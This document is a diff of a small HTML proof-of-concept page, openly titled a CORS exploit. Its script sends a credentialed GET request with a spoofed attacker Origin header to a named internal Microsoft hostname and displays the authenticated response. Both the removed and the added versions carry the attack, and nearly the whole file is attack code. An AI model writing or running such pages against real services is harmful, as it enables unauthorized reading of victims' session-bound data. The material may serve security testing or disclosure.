@@ -1,37 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration PoC</title>
+    <title>CORS Exploit PoC</title>
 </head>
 <body>
-    <h1>Proof of Concept: Exploiting CORS Misconfiguration</h1>
-    <button id="exploit">Send Exploit Request</button>
-    <pre id="result">Click the button to execute the PoC.</pre>
-    
+    <h1>CORS Misconfiguration Exploit</h1>
+    <button id="exploitBtn">Exploit</button>
+    <pre id="response">Click the button to exploit the vulnerability.</pre>
+
     <script>
-        document.getElementById('exploit').addEventListener('click', async () => {
-            const targetUrl = 'https://activelearning.int.cloud.microsoft.com'; // Target URL
-            const maliciousOrigin = 'https://hackbit.org'; // Replace with an attacker-controlled domain
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            // Target URL with the CORS misconfiguration
+            const targetUrl = 'https://activelearning.int.cloud.microsoft.com';
 
-            // Create a malicious request to test the CORS misconfiguration
-            try {
-                const response = await fetch(targetUrl, {
-                    method: 'GET',
-                    credentials: 'include', // Include cookies or credentials
-                    headers: {
-                        'Origin': maliciousOrigin
-                    }
-                });
-
-                // Try parsing the response as text
-                const text = await response.text();
-                document.getElementById('result').textContent = `Response from server:\n\n${text}`;
-            } catch (error) {
-                document.getElementById('result').textContent = `Error: ${error.message}`;
-            }
+            // Perform the fetch request with credentials included
+            fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include', // Include cookies and session data
+                headers: {
+                    'Origin': 'https://your-malicious-domain.com' // Replace with your domain
+                }
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Display the response from the server
+                document.getElementById('response').textContent = data;
+            })
+            .catch(err => {
+                // Display any errors that occur
+                document.getElementById('response').textContent = 'Error: ' + err;
+            });
         });
     </script>
 </body>
 </html>
+
